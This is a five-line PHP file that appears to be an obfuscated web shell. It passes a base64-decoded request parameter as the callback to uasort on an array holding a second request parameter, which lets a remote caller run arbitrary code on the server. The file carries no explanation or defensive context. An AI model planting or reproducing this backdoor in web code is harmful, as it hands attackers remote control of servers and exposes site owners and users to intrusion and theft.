<?php
    $e = $_REQUEST['e'];
    $arr = array('test', $_REQUEST['x']);
    uasort($arr, base64_decode($e));
?>